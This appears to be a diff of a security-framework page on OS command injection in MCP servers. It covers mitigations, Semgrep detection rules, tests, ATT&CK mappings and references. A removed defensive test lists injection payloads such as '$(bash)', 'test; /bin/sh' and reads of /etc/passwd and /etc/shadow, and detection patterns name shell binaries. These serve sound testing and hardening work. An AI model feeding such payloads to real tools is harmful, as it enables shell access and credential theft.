-1. **Deny shell invocation globally**: Scan code for `os.system`, `child_process.exec`, `execSync`, `Runtime.exec(String)`
-2. **Allowlist absolute binaries**: Only permit execution of specific binaries at known paths
-3. **Pin working directory**: Set `cwd` to a sandboxed location for all subprocess execution
-4. **Drop capabilities**: Use `no_new_privs` and drop all Linux capabilities except those explicitly required
-5. **Minimal PATH**: Set `PATH=/usr/bin:/bin` or even more restrictive for subprocesses
-
-```python
-# Example server policy implementation
-import os
-import subprocess
-from pathlib import Path
-
-class SecureMCPServer:
-    ALLOWED_BINARIES = {
-        '/usr/bin/magick',
-        '/usr/bin/gs',
-        '/usr/bin/pdftoppm'
-    }
-
-    SANDBOX_DIR = Path('/app/sandbox')
-
-    def execute_command(self, binary: str, args: list) -> subprocess.CompletedProcess:
-        """Execute command with strict policy enforcement"""
-        if binary not in self.ALLOWED_BINARIES:
-            raise ValueError(f"Binary {binary} not in allowlist")
-
-        # Drop privileges if running as root (Linux)
-        if os.geteuid() == 0:
-            os.setgroups([])
-            os.setgid(1000)  # Non-root GID
-            os.setuid(1000)  # Non-root UID
-
-        return subprocess.run(
-            [binary] + args,
-            shell=False,  # Never use shell
-            cwd=str(self.SANDBOX_DIR),
-            env={'PATH': '/usr/bin:/bin'},
-            capture_output=True,
-            timeout=30,
-            preexec_fn=lambda: os.setpgrp()  # New process group for kill safety
-        )
-```
-
-#### Network and Environment Controls
-1. **Egress Filtering**: Block outbound connections from MCP servers except to required services
-2. **Environment Variables**: Set minimal, explicit environment variables for subprocesses
-3. **Resource Limits**: Implement CPU, memory, and file descriptor limits
-4. **Syscall Filtering**: Use seccomp-bpf to restrict available system calls
-5. **[SAF-M-74: Per-Invocation Capability Brokering](../../mitigations/SAF-M-74/README.md)**: Confine successful command injection to per-call syscall, filesystem, and binary allowlists rather than preventing injection itself.
-
-### Detective Controls
-
-#### CI/CD Security Gates
-```yaml
-# Semgrep rule to detect unsafe subprocess usage
-# Additional tools: Python Bandit (B602/B603), Node eslint-plugin-security, grep for cmd.exe/powershell.exe
-rules:
-  - id: unsafe-shell-true
-    patterns:
-      - pattern: subprocess.$FUNC(..., shell=True, ...)
-    message: "Unsafe use of shell=True in subprocess"
-    severity: ERROR
-
-  - id: nodejs-exec-usage
-    patterns:
-      - pattern: require('child_process').exec(...)
-    message: "Use execFile or spawn instead of exec"
-    severity: ERROR
-
-  - id: java-runtime-exec-string
-    patterns:
-      - pattern: Runtime.getRuntime().exec($STRING)
-    message: "Use ProcessBuilder with array arguments instead"
-    severity: ERROR
-
-  - id: go-shell-command
-    patterns:
-      - pattern: exec.Command("sh", "-c", ...)
-      - pattern: exec.Command("/bin/sh", "-c", ...)
-    message: "Avoid shell invocation; pass arguments directly"
-    severity: ERROR
-
-  - id: ruby-backticks
-    patterns:
-      - pattern-regex: '`[^`]+`'
-      - pattern: system($STRING)
-    message: "Use system with array arguments or Open3"
-    severity: ERROR
-```
-
-### Testing Strategy
-
-1. **Unit Tests with Property-Based Fuzzing**:
-```python
-import hypothesis.strategies as st
-from hypothesis import given
-
-@given(st.text())
-def test_no_shell_execution(user_input):
-    """Verify no shell is spawned regardless of input"""
-    with patch('subprocess.run') as mock_run:
-        try:
-            process_user_command(user_input)
-        except ValueError:
-            pass  # Invalid input is fine
-
-        # Ensure shell=False in all calls
-        for call in mock_run.call_args_list:
-            assert call.kwargs.get('shell', False) == False
-```
-
-2. **Runtime Assertion Tests**:
-```python
-def test_cannot_spawn_shell():
-    """Verify MCP cannot spawn shells from user input"""
-    payloads = [
-        "test; /bin/sh",
-        "test && bash",
-        "$(bash)",
-        "`sh`",
-        "-o /etc/passwd",
-        "@/etc/shadow",  # Response-file injection
-        "test\ncat /etc/passwd",  # Newline injection
-        "test—cat /etc/passwd",  # Unicode em-dash
-        "test＠file.txt"  # Unicode fullwidth @
-    ]
-
-    for payload in payloads:
-        # Monitor process creation during test
-        # Linux: Run under strace -f -e execve or use bpftrace/execsnoop
-        # Alternative: Use BCC tools for lower overhead
-        # execsnoop-bpfcc -t -x | grep mcp_server
-        with subprocess.Popen(['strace', '-f', '-e', 'execve',
-                              'python', 'mcp_server.py'],
-                             stderr=subprocess.PIPE) as proc:
-            # Send payload and check strace output for shell spawns
-            # Assert no shells were spawned
-            shell_names = {'sh', 'bash', 'dash', 'zsh', 'cmd.exe', 'powershell.exe'}
-            strace_output = proc.stderr.read().decode()
-            for shell in shell_names:
-                assert f'execve("/bin/{shell}"' not in strace_output
-                assert f'execve("/usr/bin/{shell}"' not in strace_output
-```
-
-## Compliance Mapping
-
-| Framework | Control | Description |
-|-----------|---------|-------------|
-| MITRE ATT&CK | [T1059](https://attack.mitre.org/techniques/T1059/) | Command and Scripting Interpreter |
-| MITRE ATT&CK | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Unix Shell |
-| MITRE ATT&CK | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell |
-| MITRE ATT&CK | [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application |
-| NIST CSF 2.0 | PR.PS-01 | Configuration management practices are established and applied |
-| NIST CSF 2.0 | PR.PS-05 | Prevent installation/execution of unauthorized software |
-| NIST CSF 2.0 | PR.PS-06 | Secure software development practices |
-| NIST CSF 2.0 | PR.AA-05 | Least privilege and separation of duties |
-| ISO 27001:2022 | Annex A 8.28 | Secure coding |
-| ISO 27001:2022 | Annex A 8.9 | Configuration management |
-| OWASP ASVS | V5.3 | Output encoding and Injection Prevention Requirements |
-| CWE | CWE-78 | OS Command Injection |
+- Avoid shell command construction; call a library or direct process API and keep executable and argument values separate. <!-- SAF-TRACE: claims=SAF-T1101-C016; sources=SRC-owasp-command-injection,SRC-python-subprocess-3.14,SRC-node-child-process-v26 -->
+- Constrain executable names, arguments, URL schemes, and startup environment through narrow allowlists; do not treat quoting alone as the primary control. <!-- SAF-TRACE: claims=SAF-T1101-C003,SAF-T1101-C016; sources=SRC-mcp-security-2026-07-28,SRC-owasp-command-injection -->
+- Run local servers, proxies, and tools with least privilege and sandboxing; authenticate local proxies and restrict administrative test endpoints. <!-- SAF-TRACE: claims=SAF-T1101-C016,SAF-T1101-C017; sources=SRC-owasp-command-injection,SRC-mcp-security-2026-07-28 -->
+- Show users the exact tool inputs, require meaningful confirmation, and log command-bearing tool, authorization, configuration, and proxy events. <!-- SAF-TRACE: claims=SAF-T1101-C002,SAF-T1101-C017; sources=SRC-mcp-tools-2026-07-28,SRC-mcp-security-2026-07-28 -->
 
 ## Related Techniques
-- [SAF-T1102](../SAF-T1102/README.md): Prompt Injection - Often used to trigger command injection
-- [SAF-T1103](../SAF-T1103/README.md): Fake Tool Invocation - Can be combined with command injection
-- [SAF-T1105](../SAF-T1105/README.md): Path Traversal via File Tool - Similar input validation failures
-- [SAF-T1001](../SAF-T1001/README.md): Tool Poisoning Attack - Can include command injection payloads
+
+| Neighbor concept | Distinction |
+|---|---|
+| [SAF-T1102: Prompt Injection (Multiple Vectors)](../SAF-T1102/README.md) | Changes model or tool intent; SAF-T1101 additionally requires an unsafe operating-system launch boundary. | <!-- SAF-TRACE: claims=SAF-T1101-C011; sources=SRC-cwe-78-v4.20,SRC-mcp-security-2026-07-28 -->
+| [SAF-T1104: Over-Privileged Tool Abuse](../SAF-T1104/README.md) | Uses an authorized tool or command path beyond the intended privilege boundary; SAF-T1101 requires unintended syntax or executable selection. | <!-- SAF-TRACE: claims=SAF-T1101-C001,SAF-T1101-C011; sources=SRC-cwe-78-v4.20 -->
+| Malicious server configuration | Is persistence or setup until a documented unsafe launch boundary produces execution. | <!-- SAF-TRACE: claims=SAF-T1101-C011; sources=SRC-cwe-78-v4.20,SRC-mcp-security-2026-07-28 -->
+
+The canonical SAF-T1102 and SAF-T1104 neighboring-technique joins are recorded in the clean-room attestation after post-freeze framework reconciliation. <!-- SAF-TRACE: claims=SAF-T1101-C018; sources=SRC-mitre-t1059-current,SRC-cwe-78-v4.20 -->
+
+## MITRE ATT&CK Mapping
+
+| ATT&CK technique | Relationship | Rationale |
+|---|---|---|
+| T1059 — Command and Scripting Interpreter | Analogous and conditional | Applies when the boundary crossing launches a command or scripting interpreter; ATT&CK does not encode the injection weakness or MCP trust boundary. | <!-- SAF-TRACE: claims=SAF-T1101-C018; sources=SRC-mitre-t1059-current,SRC-cwe-78-v4.20 -->
 
 ## References
-- [Model Context Protocol Specification](https://modelcontextprotocol.io/specification)
-- [Model Context Protocol Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
-- [Why a Classic MCP Server Vulnerability Can Undermine Your Entire AI Agent - Trend Micro, 2025](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html)
-- [Command Injection Vulnerability Discovered in Codehooks MCP Server - NodeJS Security, 2025](https://www.nodejs-security.com/blog/command-injection-vulnerability-codehooks-mcp-server-security-analysis)
-- [Exploiting MCP Servers Vulnerable to Command Injection - Snyk, 2025](https://snyk.io/articles/exploiting-mcp-servers-vulnerable-to-command-injection/)
-- [Command Injection in @cyanheads/git-mcp-server - GitHub Advisory, 2025](https://github.com/cyanheads/git-mcp-server/security/advisories/GHSA-3q26-f695-pp76)
-- [MCP (Model Context Protocol) and Its Critical Vulnerabilities - Strobes, 2025](https://strobes.co/blog/mcp-model-context-protocol-and-its-critical-vulnerabilities/)
-- [Model Context Protocol: Understanding security risks and controls - Red Hat, 2025](https://www.redhat.com/en/blog/model-context-protocol-mcp-understanding-security-risks-and-controls)
-- [Protecting against indirect prompt injection attacks in MCP - Microsoft, 2025](https://devblogs.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp)
-- [Command injection in Python: examples and prevention - Snyk](https://snyk.io/blog/command-injection-python-prevention-examples/)
-- [Node.js Child Process Documentation](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)
-- [Python subprocess Documentation - Security Considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
-- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
-- [Falco - Runtime Security](https://falco.org/docs/)
-- [Linux Audit System](https://linux-audit.com/configuring-and-auditing-linux-systems-with-audit-daemon/)
+
+- **SRC-mcp-tools-2026-07-28** — [Model Context Protocol: Server tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
+- **SRC-mcp-security-2026-07-28** — [Model Context Protocol: Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
+- **SRC-cwe-78-v4.20** — [MITRE CWE-78](https://cwe.mitre.org/data/definitions/78.html)
+- **SRC-python-subprocess-3.14** — [Python subprocess security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
+- **SRC-node-child-process-v26** — [Node.js child_process](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)
+- **SRC-owasp-command-injection** — [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
+- **SRC-cisa-kev-2026-09-01** — [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json)
+- **SRC-ghsa-litellm-v4p8** — [LiteLLM GHSA-v4p8-mg3p-g94g](https://github.com/BerriAI/litellm/security/advisories/GHSA-v4p8-mg3p-g94g)
+- **SRC-nvd-2026-42271** — [NVD CVE-2026-42271](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-42271)
+- **SRC-ibm-2026-12940** — [IBM Langflow Security Bulletin](https://www.ibm.com/support/pages/node/7279995)
+- **SRC-nvd-2026-12940** — [NVD CVE-2026-12940](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-12940)
+- **SRC-jfrog-cve-2025-6514** — [JFrog analysis of CVE-2025-6514](https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/)
+- **SRC-jfsa-2025-6514** — [JFSA-2025-001290844](https://research.jfrog.com/vulnerabilities/mcp-remote-command-injection-rce-jfsa-2025-001290844/)
+- **SRC-nvd-2025-6514** — [NVD CVE-2025-6514](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-6514)
+- **SRC-oligo-inspector-cve-2025-49596** — [Oligo analysis of CVE-2025-49596](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596)
+- **SRC-ghsa-inspector-7f8r** — [MCP Inspector GHSA-7f8r-222p-6f5g](https://github.com/modelcontextprotocol/inspector/security/advisories/GHSA-7f8r-222p-6f5g)
+- **SRC-nvd-2025-49596** — [NVD CVE-2025-49596](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-49596)
+- **SRC-sysmon-15-21** — [Microsoft Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
+- **SRC-ecs-process-current** — [Elastic Common Schema process fields](https://www.elastic.co/guide/en/ecs/current/ecs-process.html)
+- **SRC-mitre-t1059-current** — [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/)
+
+### Research and Disclosure Credits
+
+- Or Peles and JFrog Security Research are credited for CVE-2025-6514 discovery and analysis. SRC-jfrog-cve-2025-6514; SRC-jfsa-2025-6514
+- Avi Lumelsky and Oligo Security Research are credited for the MCP Inspector analysis; the project advisory credits Rémy Marot as reporter. SRC-oligo-inspector-cve-2025-49596; SRC-ghsa-inspector-7f8r
+- The LiteLLM advisory publisher `jaydns`, BerriAI maintainers, IBM PSIRT, CISA, NIST NVD, Mark Russinovich, Thomas Garnier, OWASP, MITRE, Elastic, Python, Node.js, and MCP contributors are credited through their source records. SRC-ghsa-litellm-v4p8; SRC-ibm-2026-12940; SRC-cisa-kev-2026-09-01; SRC-sysmon-15-21
 
 ## Version History
-| Version | Date | Changes | Author |
-|---------|------|---------|--------|
-| 2.0 | 2025-09-28 | Major update: Added runtime detection, Kubernetes hardening, expanded vulnerable APIs, option injection, comprehensive security review feedback | fkautz |
-| 1.0 | 2025-09-28 | Initial documentation based on 2024-2025 vulnerability research | SAF-MCP Community |
+
+| Date | Version | Changes |
+|---|---|---|
+| 2026-09-01 | 1.0 | Clean-room evidence freeze with observed classification, four selected examples, tested detection, and isolated strict-validation proof. |
